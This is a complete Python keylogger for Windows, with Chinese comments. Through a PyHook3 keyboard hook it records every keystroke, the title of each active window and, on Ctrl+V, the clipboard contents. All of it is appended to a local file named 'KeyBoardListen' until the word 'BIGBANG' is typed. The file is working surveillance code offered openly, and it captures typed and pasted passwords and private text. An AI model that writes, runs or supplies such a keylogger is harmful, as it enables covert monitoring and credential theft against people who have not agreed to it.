# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import PyHook3
import win32clipboard
import os,sys
path=os.getcwd()

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
#退出监听的指令单词，可以修改
QUIT_WORD="BIGBANG"
QUIT_CONT=QUIT_WORD
# Fkey=["F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"]
# 定义击键监听事件函数
def OnKeyboardEvent(event):
    global current_window,QUIT_WORD,QUIT_CONT,path
    FileStr=""
    if(len(QUIT_WORD)==0):
        FileStr+="\n--------------------结束监听--------------------\n\n\n"
        fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
        fp.write(FileStr)
        fp.close()
        print("\n--------------------结束监听--------------------\n")
        sys.exit()
        return False
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.Window != current_window:
        current_window = event.Window
        # event.WindowName有时候会不好用
        # 所以调用底层API喊来获取窗口标题
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(event.Window,
                                     byref(windowTitle),
                                     512)
        windowName = windowTitle.value.decode('gbk')
        FileStr+="\n"+("-"*60)+"\n窗口名:%s\n窗口ID:%s\n"%(windowName,event.Window)
        print("\n-----------------")
        print("窗口名:%s"%windowName)
        print("窗口ID:%s"%event.Window)
    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        FileStr+=chr(event.Ascii)+' '
        print(chr(event.Ascii),end=' ')
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            print()
            print("-"*60)
            print("检测到粘贴快捷键")
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[粘贴内容] %s" % (pasted_value),end=' ')
            print()
            print("-"*60)
            FileStr+='\n'+("-"*60)+'\n'+"检测到粘贴快捷键\n"
            FileStr+="[粘贴内容] "+pasted_value
            FileStr+="\n"
            FileStr+=("-"*60)+'\n'
        elif event.Key=="Z":
            FileStr+="[Ctrl+Z] "
            print("[Ctrl+Z]",end=' ')
        elif event.Key=="A":
            FileStr+="[全选] "
            print("[全选]",end=' ')
        elif event.Key=="C":
            FileStr+="[Ctrl+C] "
            print("[Ctrl+C]",end=' ')
        else:
            if(event.Key=="Space"):
                FileStr+="[空格] "
                print("[空格]",end=' ')
            elif(event.Key=="Lshift"):
                FileStr+="[左Shift] "
                print("[左Shift]",end=' ')
            elif(event.Key=="Left"):
                FileStr+="[←] "
                print("[←]",end=' ')
            elif(event.Key=="Right"):
                FileStr+="[→] "
                print("[→]",end=' ')
            elif(event.Key=="Up"):
                FileStr+="[↑] "
                print("[↑]",end=' ')
            elif(event.Key=="Down"):
                FileStr+="[↓] "
                print("[↓]",end=' ')
            elif(event.Key=="Lmenu"):
                FileStr+="[左Alt] "
                print("[左Alt]",end=' ')
            elif(event.Key=="Rmenu"):
                FileStr+="[右Alt] "
                print("[右Alt]",end=' ')
            elif(event.Key=="Rshift"):
                FileStr+="[右Shift] "
                print("[右Shift]",end=' ')
            elif(event.Key=="Lcontrol"):
                FileStr+="[左Ctrl] "
                print("[左Ctrl]",end=' ')
            elif(event.Key=="Rcontrol"):
                FileStr+="[右Ctrl] "
                print("[右Ctrl]",end=' ')
            elif(event.Key=="Return"):
                FileStr+="[回车] "
                print("[回车]",end=' ')
            elif(event.Key=="Back"):
                FileStr+="[删除] "
                print("[删除]",end=' ')
            elif(event.Key=="Delete"):
                FileStr+="[Del] "
                print("[Del]",end=' ')
            elif(event.Key=="Insert"):
                FileStr+="[Ins] "
                print("[Ins]",end=' ')
            elif(event.Key=="Prior"):
                FileStr+="[PgUp] "
                print("[PgUp]",end=' ')
            elif(event.Key=="Next"):
                FileStr+="[PgDn] "
                print("[PgDn]",end=' ')
            elif(event.Key=="End"):
                FileStr+="[End] "
                print("[End]",end=' ')
            elif(event.Key=="Home"):
                FileStr+="[Home] "
                print("[Home]",end=' ')
            elif(event.Key=="None"):
                FileStr+="[None] "
                print("[None]",end=' ')
            elif(event.Key=="Apps"):
                #就是右Alt右边的那个键
                FileStr+="[菜单] "
                print("[菜单]",end=' ')
            elif(event.Key=="Capital"):
                FileStr+="[大写] "
                print("[大写]",end=' ')
            elif(event.Key=="Tab"):
                FileStr+="[Tab] "
                print("[Tab]",end=' ')
            elif(event.Key=="Lwin"):
                FileStr+="[左Win] "
                print("[左Win]",end=' ')
            elif(event.Key=="Rwin"):
                FileStr+="[右Win] "
                print("[右Win]",end=' ')
            elif(event.Key=="Escape"):
                FileStr+="[Esc] "
                print("[Esc]",end=' ')
            elif(event.Key=="Pause"):
                #就是PrintScreen右边那个键
                FileStr+="[暂停] "
                print("[暂停]",end=' ')
            elif(event.Key=="Snapshot"):
                FileStr+="[截屏] "
                print("[截屏]",end=' ')
            else:
                FileStr+="[%s] "%event.Key
                print("[%s]"%event.Key,end=' ')
    #判断退出监听指令符
    if (event.Key==QUIT_WORD[0]):
        QUIT_WORD=QUIT_WORD[1:]
        if(len(QUIT_WORD)==0):
            FileStr+="\n--------------------结束监听--------------------\n\n\n"
            fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
            fp.write(FileStr)
            fp.close()
            print("\n--------------------结束监听--------------------\n")
            sys.exit()
            return False
    else:
        QUIT_WORD=QUIT_CONT
    #写入文件
    fp=open(path+"/KeyBoardListen","a",encoding='utf-8')
    fp.write(FileStr)
    fp.close()
    # 循环监听下一个击键事件
    return True

# 创建并注册hook管理器
kl = PyHook3.HookManager()  #
kl.KeyDown = OnKeyboardEvent

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()